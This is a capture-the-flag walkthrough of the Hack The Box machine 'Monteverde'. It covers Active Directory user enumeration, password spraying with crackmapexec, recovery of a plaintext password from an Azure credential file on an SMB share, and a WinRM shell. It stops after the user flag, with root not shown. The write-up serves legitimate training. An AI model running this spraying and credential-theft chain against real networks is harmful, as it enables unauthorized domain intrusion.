---
layout: post
title: Hackthebox Monteverde Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-06-20/monteverde.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `Monteverde`.

# Solution
## 1. Initial Enumeration
### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.172 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 20:39 EEST
Nmap scan report for 10.10.10.172
Host is up (0.12s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-13 17:03:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49775/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/13%Time=5EE510FD%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -43m23s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-06-13T17:05:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 746.57 seconds
root@kali:~#
```

### SMB enumeration
```shell
root@kali:~# smbclient -N -L 10.10.10.172
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
root@kali:~# 
```

### RPC enumeration
```shell
root@kali:~# rpcclient -U "" -N 10.10.10.172
rpcclient $> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
rpcclient $> 
```

### User enumeration with windapsearch
```shell
root@kali:~/windapsearch# ./windapsearch.py -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

## 2. Getting User

```shell
root@kali:~# cat user.txt 
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

Password spraying using crackmapexec. We can find a credential `SABatchJobs:SABatchJobs` available.
```shell
root@kali:~# pip install crackmapexec

---

root@kali:~# crackmapexec smb 10.10.10.172 -d megabank -u user.txt -p user.txt 
[*] Initializing the database
CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:mhope STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:SABatchJobs STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:svc-ata STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:svc-bexec STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:svc-netapp STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:dgalanos STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:roleary STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:smorgan STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\SABatchJobs:mhope STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [+] megabank\SABatchJobs:SABatchJobs 
[*] KTHXBYE!
root@kali:~#
```

```shell
root@kali:~# smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs 
[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	azure_uploads                                     	READ ONLY	
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	users$                                            	READ ONLY
```

```shell
root@kali:~# smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'
[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	users$                                            	READ ONLY	
	.\users$\*
	dr--r--r--                0 Fri Jan  3 15:12:48 2020	.
	dr--r--r--                0 Fri Jan  3 15:12:48 2020	..
	dr--r--r--                0 Fri Jan  3 15:15:23 2020	dgalanos
	dr--r--r--                0 Fri Jan  3 15:41:18 2020	mhope
	dr--r--r--                0 Fri Jan  3 15:14:56 2020	roleary
	dr--r--r--                0 Fri Jan  3 15:14:28 2020	smorgan
	.\users$\mhope\*
	dr--r--r--                0 Fri Jan  3 15:41:18 2020	.
	dr--r--r--                0 Fri Jan  3 15:41:18 2020	..
	fw--w--w--             1212 Fri Jan  3 16:59:24 2020	azure.xml
```

```shell
root@kali:~# smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 15:12:48 2020
  ..                                  D        0  Fri Jan  3 15:12:48 2020
  dgalanos                            D        0  Fri Jan  3 15:12:30 2020
  mhope                               D        0  Fri Jan  3 15:41:18 2020
  roleary                             D        0  Fri Jan  3 15:10:30 2020
  smorgan                             D        0  Fri Jan  3 15:10:24 2020

		524031 blocks of size 4096. 519955 blocks available
smb: \> get mhope\azure.xml
getting file \mhope\azure.xml of size 1212 as mhope\azure.xml (7.5 KiloBytes/sec) (average 7.5 KiloBytes/sec)
smb: \>
```

```shell
root@kali:~# cat 'mhope\azure.xml' 
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
root@kali:~#
```

```shell
root@kali:~/evil-winrm# ./evil-winrm.rb -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> type ../Desktop/user.txt
4961976bd7d8f4eeb2ce3705e2f212f2
*Evil-WinRM* PS C:\Users\mhope\Documents>
```

## 3. Getting Root

```shell
*Evil-WinRM* PS C:\Program Files> ls


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:31 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
d-----         1/3/2020   5:28 AM                PackageManagement
d-----         1/2/2020   9:37 PM                VMware
d-r---         1/2/2020   2:46 PM                Windows Defender
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         1/2/2020   2:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         1/2/2020   2:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         1/3/2020   5:28 AM                WindowsPowerShell


*Evil-WinRM* PS C:\Program Files> 
```